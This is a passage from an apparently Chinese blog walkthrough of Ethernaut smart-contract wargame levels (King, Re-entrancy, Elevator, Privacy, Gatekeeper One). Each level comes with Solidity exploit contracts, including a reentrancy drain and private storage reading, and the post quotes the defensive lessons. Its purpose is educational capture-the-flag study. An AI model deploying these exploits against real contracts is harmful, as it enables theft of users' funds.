<p><code>&lt;address&gt;.transfer()</code><br>&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会 throw; 回滚状态<br>&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy）</p>
<p><code>&lt;address&gt;.send()</code><br>&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false<br>&nbsp;&nbsp;&nbsp;&nbsp;只会传递部分 Gas 供调用，防止重入（reentrancy）</p>
<p><code>&lt;address&gt;.call.value()()</code><br>&nbsp;&nbsp;&nbsp;&nbsp;当发送失败时会返回 false<br>&nbsp;&nbsp;&nbsp;&nbsp;传递所有可用 Gas 供调用，不能有效防止重入（reentrancy）</p>
<h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.由于最后合约<code>owner</code>会调用<code>fallback</code>函数成为新的king，所以我们需要阻止这个函数的运行，也就是阻止<code>transfer</code><br>2.我们可以自己写个合约并将<code>fallback</code>函数设为<code>revert()</code>，这样就没有人可以通过<code>transfer()</code>打钱给我们。当然我们甚至可以不写<code>fallback</code>函数也可以实现这个效果</p>
<h3 id="具体步骤-8"><a href="#具体步骤-8" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约(试了好几种写法都不行，只有这种可以，奇怪了)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line">    function exp() public payable &#123;</span><br><span class="line">        address attackAddr = <span class="number">0x529c6e4d28d24af49eada89a2f7effa44c8f58c3</span>; </span><br><span class="line">        attackAddr.call.gas(<span class="number">1000000</span>).value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.部署合约，注意要传入比原先的<code>1ETH</code>多</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/37.jpg" alt="37"></div>

<p>3.查看king可以发现king已经变成了我们部署的合约的地址</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/38.jpg" alt="38"></div>

<p>4.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-9"><a href="#通关后的彩蛋-9" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Most of Ethernaut’s levels try to expose (in an oversimpliefied form of course) something that actually happend. A real hack or a real bug.<br>In this case, see: <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html" target="_blank" rel="noopener">King of the Ether</a> and <a href="http://www.kingoftheether.com/postmortem.html" target="_blank" rel="noopener">King of the Ether Postmortem</a></p>
</blockquote>
<hr>
<h2 id="level-10-Re-entrancy"><a href="#level-10-Re-entrancy" class="headerlink" title="level 10- Re-entrancy"></a>level 10- Re-entrancy</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0xf70706db003e94cfe4b5e27ffd891d5c81b39488" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-9"><a href="#胜利条件-9" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.将合约中的所有钱卷走</p>
<h3 id="tips-6"><a href="#tips-6" class="headerlink" title="tips"></a>tips</h3><p>1.不可信的合约可以执行人们不希望出现的代码<br>2.<code>Fallback</code>方法<br>3.<code>Throw/revert bubbling</code><br>4.用其他合约去攻击这个合约<br>5.用<code>Remix</code>或<code>Truffle</code></p>
<h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>这是一个比较著名的重入漏洞，漏洞点在<code>withdraw</code>，它会先判断账户是否有那么多余额在调用<code>call</code>进行转账，然后再将<code>balances</code>中的金额减少。<br>但是我们前面说过<code>call</code>过去的地址如果是个合约地址，并且合约的<code>fallback</code>函数也调用了<code>withdraw</code>函数，那么这就会成为一个递归问题，一直到<code>gas=0</code>才会停止。<br>div style=”width: 50%; margin: auto”&gt;<img src="/2019/01/08/ethernautd训练/39.jpg" alt="39"><br>所以我们可以利用这个机制编写合约将钱全部提出。</p>
<h3 id="具体步骤-9"><a href="#具体步骤-9" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function() public payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0xdc8941b8396a3140b008d124fcd149acd2005eff</span>;</span><br><span class="line">    Reentrance target = Reentrance(instance_address);</span><br><span class="line"></span><br><span class="line">    function exp() payable&#123;&#125;</span><br><span class="line"></span><br><span class="line">    function donate() public payable &#123;</span><br><span class="line">        target.donate.value(msg.value)(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        //这题有bug，不会自己回调fallback函数，要你写两次withdraw才可以</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get_balance() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> target.balanceOf(this);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function my_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ins_eth_bal() public view returns(uint) &#123;</span><br><span class="line">        <span class="keyword">return</span> instance_address.balance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">        //同理写两次</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">        target.withdraw(<span class="number">0.5</span> ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.调用<code>donate</code>方法捐款<code>2ETH</code></p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/40.jpg" alt="40"></div>

<p>3.调用<code>attack</code>方法进行攻击，可以看见钱全部在我们这里并且整数溢出了</p>
<div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/41.jpg" alt="41"></div><br>攻击后的结果<br><div style="width: 50%; margin: auto"><img src="/2019/01/08/ethernautd训练/42.jpg" alt="42"></div>

<p>4.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-10"><a href="#通关后的彩蛋-10" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Use <code>transfer</code> to move funds out of your contract, since it <code>throws</code> and limits gas forwarded. Low level functions like <code>call</code> and <code>send</code> just return false but don’t interrupt the execution flow when the receiving contract fails.<br>Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.<br>Re-entrancy is a common attack. You should always be prepared for it!</p>
</blockquote>
<blockquote>
<p><strong>The DAO Hack</strong><br>The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See <a href="https://blog.zeppelin.solutions/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942" target="_blank" rel="noopener">15 lines of code that could have prevented TheDAO Hack.</a></p>
</blockquote>
<hr>
<h2 id="level-11-Elevator"><a href="#level-11-Elevator" class="headerlink" title="level 11- Elevator"></a>level 11- Elevator</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0xcd596b3e7063b068f54054beb4fb4074c87e8ad8" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-10"><a href="#胜利条件-10" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.将<code>top</code>设为true</p>
<h3 id="tips-7"><a href="#tips-7" class="headerlink" title="tips"></a>tips</h3><p>1.有时<code>solidity</code>语言不能保持诺言.<br>2.<code>Elevator</code>可以被<code>Building</code>利用.</p>
<h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-7"><a href="#预备知识-7" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.<code>view</code>关键字<br>可以大概查看<a href="https://blog.csdn.net/wzygis/article/details/82695727" target="_blank" rel="noopener">这篇文章</a>了解一下</p>
<h3 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.第一个方法是在我们自己设置的合约里面设置一个变量为<code>true</code>，每次调用<code>isLastFloor</code>函数的时候将该变量取反并返回。这是可行的，因为：</p>
<blockquote>
<p>当前 Solidity 编译器没有强制执行视图函数（view function）或常量函数（constant function）不能修改状态。而且也没有强制纯函数（pure function）不读取状态信息。所以声明一个 view 和 pure 函数，并不保证就不修改数据状态。</p>
</blockquote>
<p>2.第二个方法是我们每次调用<code>isLastFloor</code>函数的时候通过判断<code>gas的奇偶</code>来返回<code>true or flase</code>,一定概率下是可以碰撞成功的</p>
<h3 id="具体步骤-10"><a href="#具体步骤-10" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.编写exp合约<br>a.第一种方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x71e4e8947b9755da6b649e6ce86394e6a4e796bf</span>;</span><br><span class="line">    Elevator e = Elevator(instance_address);</span><br><span class="line">    bool public isLast = true;</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) public returns (bool) &#123;</span><br><span class="line">        isLast = ! isLast;</span><br><span class="line">        <span class="keyword">return</span> isLast;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        e.goTo(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>b.第二种方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  function isLastFloor(uint) view public returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line"></span><br><span class="line">    address instance_address = <span class="number">0x71e4e8947b9755da6b649e6ce86394e6a4e796bf</span>;</span><br><span class="line">    Elevator e = Elevator(instance_address);</span><br><span class="line"></span><br><span class="line">    function isLastFloor(uint) public returns (bool) &#123;</span><br><span class="line">        <span class="keyword">return</span> (gasleft())%<span class="number">2</span>==<span class="number">0</span>; <span class="comment">#低版本可以使用msg.gas</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        e.goTo(<span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>2.调用<code>attack()</code>方法<br>3.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-11"><a href="#通关后的彩蛋-11" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><blockquote>
<p>Currently, the Solidity compiler does nothing to enforce that a <code>view</code> or <code>constant</code> function is not modifying state. The same applies to <code>pure</code> functions, which should not read state but they can. Make sure you read <a href="https://solidity.readthedocs.io/en/develop/contracts.html#view-functions" target="_blank" rel="noopener">Solidity’s documentation</a> and learn its caveats.<br>An alternative way to solve this level is to build a view function which returns different results depends on input data but don’t modify state, e.g. <code>gasleft()</code>.</p>
</blockquote>
<hr>
<h2 id="level-12-Privacy"><a href="#level-12-Privacy" class="headerlink" title="level 12- Privacy"></a>level 12- Privacy</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x76b9fade124191ff5642ba1731a8279b30ebe644" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-11"><a href="#胜利条件-11" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.调用<code>unlock函数</code>将<code>locked</code>设为false</p>
<h3 id="tips-8"><a href="#tips-8" class="headerlink" title="tips"></a>tips</h3><p>1.了解<code>storage,parameter parsing和casting</code>是如何工作的<br>2.使用<code>remix</code>或使用自己搭载的<code>web3</code>提供程序</p>
<h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = true;</span><br><span class="line">  uint256 public constant ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  function Privacy(bytes32[<span class="number">3</span>] _data) public &#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`</span><br><span class="line">      .,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,</span><br><span class="line">      *.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^         ,---/V\</span></span><br><span class="line"><span class="string">      `*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.    ~|__(o.o)</span><br><span class="line">      ^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>^`*.,*<span class="string">'^`*.,*'</span>  UU  UU</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="预备知识-8"><a href="#预备知识-8" class="headerlink" title="预备知识"></a>预备知识</h3><p>1.如何读取合约的<code>storage</code></p>
<blockquote>
<p>web3.eth.getStorageAt(contract.address, 0, function(x, y) {alert(y)}); //其中0可以换成1，2，3<br>2.变量存储规则<br>根据 Solidity 优化规则，当变量所占空间<code>小于 32 字节</code>时，会与后面的变量共享空间，如果加上后面的变量也不超过 32 字节的话。<br><code>constant常量</code>是无需存储的</p>
</blockquote>
<h3 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.通过读取<code>storage</code>得到一系列数据并找出<code>data[2]</code>提交到<code>unlock</code>函数解锁</p>
<h3 id="具体步骤-11"><a href="#具体步骤-11" class="headerlink" title="具体步骤"></a>具体步骤</h3><p>1.读取合约的<code>storage</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000007b3ff0a01</span></span><br><span class="line"><span class="number">0x79a1ed4c7ba7bbe11d264f4ee6c1d980fe0e5087e9baf770a19f7fe605dcd434</span></span><br><span class="line"><span class="number">0xbbd5d1cf216d04652f128560551961bdb24c58cd4a50182a6ff2c19b0e1e5e06</span></span><br><span class="line"><span class="number">0xd83aa7d5f6da7a858cc7a3646ab832ab7a7429a433c98cca8bb859436d8ad5e2</span></span><br><span class="line"><span class="number">0x0000000000000000000000000000000000000000000000000000000000000000</span></span><br></pre></td></tr></table></figure></p>
<p>2.进行分析<br>除了<code>ID</code>常量不用存储，其他的常量分别如下：<br>a.<code>bool public locked = true</code> 占 1 字节 -&gt; 01<br>b.<code>uint8 private flattening = 10</code> 占 1 字节 -&gt; 0a<br>c.<code>uint8 private denomination = 255</code> 占 1 字节 -&gt; ff<br>d.<code>uint16 private awkwardness = uint16(now)</code> 占 2 字节 -&gt; 07b3<br>刚好也就对应storage中的第一行最后的<code>07b3ff0a01</code>,则<code>data[2]</code>就应该是<code>第四行</code>的数据,由于是<code>byte16</code>，则提交前16个字节就行，也就是<code>d83aa7d5f6da7a858cc7a3646ab832ab</code></p>
<p>3.将<code>data[2]</code>提交到unlock函数里</p>
<blockquote>
<p>await contract.unlock(web3.toAscii(‘d83aa7d5f6da7a858cc7a3646ab832ab’))</p>
</blockquote>
<p>4.点击<code>submit instance</code>即可过关。</p>
<h3 id="通关后的彩蛋-12"><a href="#通关后的彩蛋-12" class="headerlink" title="通关后的彩蛋"></a>通关后的彩蛋</h3><hr>
<h2 id="level-13-Gatekeeper-One"><a href="#level-13-Gatekeeper-One" class="headerlink" title="level 13- Gatekeeper One"></a>level 13- Gatekeeper One</h2><p><a href="https://ethernaut.zeppelin.solutions/level/0x95850e2ac424804043086321ddae90add5c90651" target="_blank" rel="noopener">题目链接</a></p>
<h3 id="胜利条件-12"><a href="#胜利条件-12" class="headerlink" title="胜利条件"></a>胜利条件</h3><p>1.通过<code>gatekeeper</code>并注册成为<code>entrant</code></p>
<h3 id="tips-9"><a href="#tips-9" class="headerlink" title="tips"></a>tips</h3><p>1.前面的<code>Telephone</code>和<code>Token</code>关卡学到的东西很有用<br>2.您可以在Solidity的文档中了解有关<code>msg.gas</code>特殊变量或其首选别名<code>gasleft()</code>的更多信息（请参阅<a href="https://solidity.readthedocs.io/en/v0.4.23/units-and-global-variables.html" target="_blank" rel="noopener">这个</a>和<a href="https://solidity.readthedocs.io/en/v0.4.23/control-structures.html#external-function-calls" target="_blank" rel="noopener">此处</a>）。</p>
<h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(msg.gas % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    require(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h3><p>1.对于<code>gateOne</code>,我们可以通过自己编写一个合约去调用gateOne从而绕过，此时tx.origin是我们的钱包地址，msg.sender是编写的合约地址<br>2.对于<code>gateTwo</code>,我们需要通过debugger找出msg.gas是8191倍数的时候<br>3.对于<code>gateThree</code>,我们</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
